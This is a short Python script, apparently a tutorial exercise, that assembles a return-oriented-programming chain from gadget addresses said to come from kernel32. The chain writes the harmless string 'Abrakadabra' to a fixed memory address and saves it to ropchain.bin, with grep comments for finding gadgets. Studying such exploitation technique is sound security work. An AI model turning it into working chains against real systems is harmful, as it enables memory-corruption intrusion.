#!/usr/bin/python

# based on Gynvael's teachings:
# https://www.youtube.com/watch?v=iwRSFlZoSCM

from struct import pack, unpack

def db(v):
  return pack("<B", v)

def dw(v):
  return pack("<H", v)

def dd(v):
  return pack("<I", v)

def dq(v):
  return pack("<Q", v)

def rb(v):
  return unpack("<B", v[0])[0]

def rw(v):
  return unpack("<H", v[:2])[0]

def rd(v):
  return unpack("<I", v[:4])[0]

def rq(v):
  return unpack("<Q", v[:8])[0]

# ROP targed dependent

def set_rbx(v):
  # 0x7ff9706bda36 pop rbx
  # 0x7ff9706bda37 ret
  return ''.join([
    dq(0x7ff9706bda36),
    dq(v)
  ])

def set_rcx(v):
  # 0x7ff97069af87 pop rcx
  # 0x7ff97069af88 ret
  return ''.join([
    dq(0x7ff97069af87),
    dq(v)
  ])

def poke(ea, v):
  # 0x7ff9706659da mov [rbx], rcx
  # 0x7ff9706659dd ret
  return ''.join([
    set_rcx(v),
    set_rbx(ea),
    dq(0x7ff9706659da)
  ])

def poke_str(ea, s):
  while len(s) % 8 != 0:
    s += '\0'

  o = []
  for i in range(0, len(s), 8):
    o.append(poke(ea + i, rq(s[i:i+8])))

  return ''.join(o)

# build payload

rop = ''.join([
  poke_str(0x18000000, "Abrakadabra")
])

f = open("ropchain.bin", "wb")
f.write(rop)
f.close()

# grep -A 1 'pop r..' kernel32.rop | grep -B 1 'ret'
# grep -A 1 'mov \[r..\], r..' kernel32.rop | grep -B 1 'ret'
